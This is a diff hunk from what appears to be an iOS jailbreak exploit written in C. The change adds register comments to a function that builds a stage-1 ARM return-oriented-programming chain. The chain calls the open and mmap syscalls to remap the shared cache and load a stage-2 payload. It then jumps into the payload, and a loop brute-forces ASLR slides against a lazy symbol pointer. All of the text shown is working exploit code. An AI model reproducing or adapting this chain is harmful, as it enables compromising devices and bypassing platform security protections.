@@ -114,44 +114,44 @@ static int gen_stage1_part(const char *output, uint32_t start_slide, uint32_t en
     conf_write32(fd, iocaste->stage1.stack_base+0x110, 0); // pivot addr will be written here
 
     // open(dsc_path)
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x200, 0x0, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x208, iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc, SYS_open);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x210, dsc_path_addr, O_RDONLY);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x218, iocaste->stage1.stack_base+0x268, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x220, iocaste->symbols.syscall, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x228, 0x0, iocaste->gadgets.str_r0_r3_bx_lr);
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x200, 0x0, 0x0); // r4, r7
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x208, iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc, SYS_open); // pc, r0
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x210, dsc_path_addr, O_RDONLY); // r1, r2
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x218, iocaste->stage1.stack_base+0x268, 0x0); // r3, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x220, iocaste->symbols.syscall, 0x0); // pc, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x228, 0x0, iocaste->gadgets.str_r0_r3_bx_lr); // r7, pc
 
     // mmap(dsc_fd)
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x230, 0x0, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x238, iocaste->gadgets.pop_r12_pc, SYS_mmap);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x240, iocaste->gadgets.pop_r4_r5_r6_r7_pc, 0x0); // xx, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x230, 0x0, 0x0); // r4, r7
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x238, iocaste->gadgets.pop_r12_pc, SYS_mmap); // pc, r12
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x240, iocaste->gadgets.pop_r4_r5_r6_r7_pc, 0x0); // pc, r4
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x248, 0x0, 0x0); // r5, r6
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x250, 0x0, iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc); // r7, 48
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x250, 0x0, iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc); // r7, r8
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x258, iocaste->dsc.remap_base, iocaste->dsc.remap_size); // r0, r1
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x260, PROT_READ|PROT_EXEC, MAP_FILE|MAP_SHARED|MAP_FIXED); // r2, r3
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x268, 0x0, iocaste->gadgets.svc_0x80_bx_lr); // r4, pc
  
     // open(stage2_path)
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x270, 0x0, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x278, DSC_REMAP_ADDR(iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc), SYS_open);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x280, stage2_path_addr, O_RDONLY);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x288, iocaste->stage1.stack_base+0x2d8, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x290, DSC_REMAP_ADDR(iocaste->symbols.syscall), 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x298, 0x0, DSC_REMAP_ADDR(iocaste->gadgets.str_r0_r3_bx_lr));
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x270, 0x0, 0x0); // r4, r7
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x278, DSC_REMAP_ADDR(iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc), SYS_open); // pc, r0
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x280, stage2_path_addr, O_RDONLY); // r1, r2
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x288, iocaste->stage1.stack_base+0x2d8, 0x0); // r3, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x290, DSC_REMAP_ADDR(iocaste->symbols.syscall), 0x0); // pc, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x298, 0x0, DSC_REMAP_ADDR(iocaste->gadgets.str_r0_r3_bx_lr)); // r7, pc
 
     // mmap(stage2_fd)
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2a0, 0x0, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2a8, DSC_REMAP_ADDR(iocaste->gadgets.pop_r12_pc), SYS_mmap);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2b0, DSC_REMAP_ADDR(iocaste->gadgets.pop_r4_r5_r6_r7_pc), 0x0); // xx, r4
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2a0, 0x0, 0x0); // r4, r7
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2a8, DSC_REMAP_ADDR(iocaste->gadgets.pop_r12_pc), SYS_mmap); // pc, r12
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2b0, DSC_REMAP_ADDR(iocaste->gadgets.pop_r4_r5_r6_r7_pc), 0x0); // pc, r4
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x2b8, 0x0, 0x0); // r5, r6
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2c0, 0x0, DSC_REMAP_ADDR(iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc)); // r7, 48
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2c0, 0x0, DSC_REMAP_ADDR(iocaste->gadgets.pop_r0_r1_r2_r3_r4_pc)); // r7, r8
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x2c8, iocaste->stage2.stack_base, iocaste->stage2.stack_size); // r0, r1
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x2d0, PROT_READ|PROT_WRITE, MAP_FILE|MAP_PRIVATE|MAP_FIXED); // r2, r3
     conf_write32_pair(fd, iocaste->stage1.stack_base+0x2d8, 0x0, DSC_REMAP_ADDR(iocaste->gadgets.svc_0x80_bx_lr)); // r4, pc
 
     // longjmp()
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2e0, 0x0, 0x0);
-    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2e8, DSC_REMAP_ADDR(iocaste->symbols.longjump), 0x0);
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2e0, 0x0, 0x0); // r4, r7
+    conf_write32_pair(fd, iocaste->stage1.stack_base+0x2e8, DSC_REMAP_ADDR(iocaste->symbols.longjump), 0x0); // pc
 
     for (uint32_t slide = start_slide; slide > end_slide; slide-=0x1000) {
         uint32_t target = iocaste->symbols.strlcpy_lazy_ptr + slide;
